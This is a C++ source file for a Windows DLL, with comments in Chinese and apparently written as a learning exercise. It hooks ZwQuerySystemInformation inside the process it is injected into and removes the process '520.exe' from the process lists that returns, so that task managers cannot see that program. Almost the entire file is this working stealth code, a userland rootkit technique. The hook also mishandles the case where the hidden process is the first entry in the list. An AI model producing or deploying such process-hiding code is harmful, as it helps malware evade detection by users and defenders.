// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <Winternl.h>
#include"Fake.h"
#include <tchar.h>
#include <TlHelp32.h>

typedef_ZwQuerySystemInformation __OriginalZwQuerySystemInformation = NULL;
HANDLE g_dwHideProcessId = NULL;
HMODULE g_hDllModule = NULL;


BOOL SeGetProcessIdentifyByImageName(TCHAR* ImageName, HANDLE* ProcessIdentify);
bool SeCloseHandle(HANDLE HandleValue);

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	// 获取 ZwQuerySystemInformation 函数地址
	HMODULE hDll = ::GetModuleHandle(_T("ntdll.dll"));
	if (NULL == hDll)
	{
		return TRUE;
	}
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	MessageBox(NULL, L"GetProcAddress Success!", L"OK", MB_OK);
	if (NULL == ZwQuerySystemInformation)
	{
		return TRUE;
	}

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		if (SeInitialize() != STATUS_SUCCESS)
		{
			return TRUE;
		}
		SeGetProcessIdentifyByImageName(_T("520.exe"), &g_dwHideProcessId);
		if (SeCreateHook(ZwQuerySystemInformation, &New_ZwQuerySystemInformation,
			reinterpret_cast<LPVOID*>(&__OriginalZwQuerySystemInformation)) != STATUS_SUCCESS)   //winapi
		{
			return TRUE;
		}
		if (SeEnableHook(ZwQuerySystemInformation) != STATUS_SUCCESS)
		{
			return TRUE;
		}
		MessageBox(NULL, L"Hook Success!", L"OK", MB_OK);

		g_hDllModule = hModule;

		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
		SeRemoveHook(ZwQuerySystemInformation);
        break;
    }
    return TRUE;
}

NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
)
{
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	NTSTATUS status = 0;

	status = __OriginalZwQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (NT_SUCCESS(status) && 5 == SystemInformationClass)//SystemProcessInformation
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// 判断是否是要隐藏的进程PID
			if (g_dwHideProcessId == (HANDLE)pCur->UniqueProcessId)
			{
				if (pPrev == NULL)   SystemInformation = (PBYTE)pCur + pCur->NextEntryOffset;
				else if (pCur->NextEntryOffset == 0) pPrev->NextEntryOffset = 0;
				else pPrev->NextEntryOffset += pCur->NextEntryOffset;
				break;
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}
	return status;
}
BOOL SeGetProcessIdentifyByImageName(TCHAR* ImageName, HANDLE* ProcessIdentify)
{
	PROCESSENTRY32 ProcessEntry32 = { 0 };

	ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);

	//
	HANDLE SnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	//第二个参数 是进程ID，如果是获取系统进程列表或者当前进程可以设为0；
	if (SnapshotHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}


	BOOL IsOk = Process32First(SnapshotHandle, &ProcessEntry32);

	while (IsOk)
	{

		if (_memicmp(ProcessEntry32.szExeFile, ImageName, _tcslen(ProcessEntry32.szExeFile) * sizeof(TCHAR)) == 0)
		{
			*ProcessIdentify = (HANDLE)ProcessEntry32.th32ProcessID;
			goto Exit;
		}

		//获取下一个进程
		IsOk = Process32Next(SnapshotHandle, &ProcessEntry32);
	}

Exit:
	if (SnapshotHandle == NULL)
		return FALSE;
	SeCloseHandle(SnapshotHandle);


	return IsOk;
}
bool SeCloseHandle(HANDLE HandleValue)
{
	DWORD HandleFlags;
	if (GetHandleInformation(HandleValue, &HandleFlags)
		&& (HandleFlags & HANDLE_FLAG_PROTECT_FROM_CLOSE) != HANDLE_FLAG_PROTECT_FROM_CLOSE)
		return !!CloseHandle(HandleValue);
	return false;
}